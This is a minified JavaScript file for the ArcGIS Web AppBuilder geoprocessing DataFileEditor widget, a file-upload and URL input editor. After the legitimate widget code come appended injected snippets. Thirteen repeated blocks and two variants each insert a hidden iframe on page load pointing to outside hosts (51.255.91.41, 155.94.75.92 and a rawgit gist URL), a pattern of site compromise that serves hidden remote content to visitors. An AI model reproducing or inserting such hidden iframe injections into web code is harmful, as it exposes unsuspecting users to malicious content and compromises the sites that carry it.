// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/editors/DataFileEditor.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"modeSelection" style\x3d"display:none"\x3e\r\n    \x3cdiv class\x3d"field"\x3e\r\n      \x3cinput name\x3d"dataFileMode" type\x3d"radio" class\x3d"jimu-radio-btn" data-dojo-attach-point\x3d"urlMode"\r\n        data-dojo-attach-event\x3d"onclick: _onUrlModeSelect" style\x3d"font-size: 12px;"\x3e\r\n        \x3clabel style\x3d"width: auto;" class\x3d"jimu-leading-margin05"\x3e${nls.useUrlForGPInput}\x3c/label\x3e\r\n      \x3cinput name\x3d"dataFileMode" type\x3d"radio" data-dojo-attach-point\x3d"itemMode"\r\n        style\x3d"font-size: 12px;" data-dojo-attach-event\x3d"onclick: _onItemModeSelect"\r\n        class\x3d"jimu-leading-margin35 jimu-radio-btn"\x3e\x3clabel style\x3d" width: auto;"\r\n        class\x3d"jimu-leading-margin05"\x3e${nls.useUploadForGPInput}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"settingNode"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"urlNode" data-dojo-props\x3d"label:urlNode"\x3e\r\n        \x3cdiv\x3e\r\n          \x3cinput type\x3d"text" data-dojo-attach-point\x3d"urlEditor" style\x3d"width:100%"\r\n            data-dojo-type\x3d"jimu/dijit/URLInput" data-dojo-props\x3d"rest:false" class\x3d"common-input"/\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"fileNode" data-dojo-props\x3d"label:fileNode"\x3e\r\n        \x3cdiv\x3e\r\n          \x3cform data-dojo-attach-point\x3d"fileForm"\r\n                enctype\x3d"multipart/form-data"\r\n                method\x3d"POST" data-dojo-type\x3d"dijit/form/Form"\x3e\r\n            \x3cinput id\x3d"${uniqueID}_file" type\x3d"file" multiple\x3d"false" name\x3d"file"\r\n              data-dojo-attach-point\x3d"fileInput"\r\n              data-dojo-attach-event\x3d"onChange: _onUpload" style\x3d"display:none"/\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-leading-margin10 jimu-float-leading"\x3e\r\n              \x3clabel class\x3d"file-input-label" for\x3d"${uniqueID}_file"\x3e\r\n                ${nls.selectFileToUpload}\r\n              \x3c/label\x3e\r\n            \x3c/div\x3e\r\n            \x3cinput type\x3d"hidden" name\x3d"f" value\x3d"json"/\x3e\r\n          \x3c/form\x3e\r\n          \x3cspan data-dojo-attach-point\x3d"uploadFileName" class\x3d"jimu-leading-margin2"\x3e\x3c/span\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/dom-style dojo/dom-attr dojo/on dojo/Deferred dojo/text!./DataFileEditor.html dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin esri/tasks/DataFile esri/request jimu/dijit/ViewStack jimu/dijit/Message ../BaseEditor dijit/form/Form jimu/dijit/URLInput".split(" "),function(l,f,d,c,g,h,m,n,p,q,r,t,k,u){return l([u,n,p],{baseClass:"jimu-gp-editor-base jimu-gp-editor-datafile",templateString:m,editorName:"DataFileEditor",mode:"url",_url:"",_itemID:null,
uniqueID:null,constructor:function(){this.inherited(arguments);this.uniqueID=(new Date).getTime()},postCreate:function(){this.inherited(arguments);this.value&&this.parseDefaultValue();c.set(this.urlEditor,"tooltip",this.param.tooltip);"setting"===this.context?(this.viewStack=null,d.set(this.fileNode,"display","none")):(this.viewStack=new t({viewType:"dom",views:[this.urlNode,this.fileNode]}),this.viewStack.placeAt(this.settingNode),this.viewStack.startup());!0===this.config.serverInfo.supportsUpload&&
d.set(this.modeSelection,"display","");"item"===this.mode&&this.config.serverInfo.supportsUpload?(c.set(this.itemMode,"checked",!0),g.emit(this.itemMode,"click",{cancelable:!0,bubble:!0})):(c.set(this.urlMode,"checked",!0),g.emit(this.urlMode,"click",{cancelable:!0,bubble:!0}),this.urlEditor.set("value",this._url))},parseDefaultValue:function(){0===this.value.indexOf("itemID:")?this.mode="item":(0===this.value.indexOf("url:")&&(this._url=this.value.substring(4)),this.mode="url")},hasValidValue:function(){if("item"===
this.mode)return!0;if("url"===this.mode)return this.urlEditor.isValid()},getValue:function(){return"url"===this.mode?"url:"+this._getUrl():"item"===this.mode?"itemID:":""},getGPValue:function(){var b=new h,a=new q;"url"===this.mode?a.url=this._getUrl():a.itemID=this.itemIDInput;a.url||a.itemID?b.resolve(a):b.resolve(null);return b},_getUrl:function(){return this.urlEditor.isValid()?this.urlEditor.get("value"):""},_onUrlModeSelect:function(){this.mode="url";this.viewStack?this.viewStack.switchView(0):
d.set(this.urlNode,"display","block")},_onItemModeSelect:function(){this.mode="item";this.viewStack?this.viewStack.switchView(1):d.set(this.urlNode,"display","none")},_onUpload:function(){c.get(this.fileInput,"value")&&this._doUpload().then(f.hitch(this,function(b){b&&new k({message:this.nls.uploadSuccess})}),function(b){new k({message:b.message||b})})},_doUpload:function(){var b=new h,a=c.get(this.fileInput,"value"),a=a.replace(/\\/g,"/"),a=a.substr(a.lastIndexOf("/")+1);r({url:this.config.serverInfo.url+
"uploads/upload",form:this.fileForm.domNode,handleAs:"json"}).then(f.hitch(this,function(e){e.success&&(this.itemIDInput=e.item.itemID,c.set(this.fileInput,"value",""),c.set(this.uploadFileName,"innerHTML",a));b.resolve(e.success)}),function(a){b.reject(a)});return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});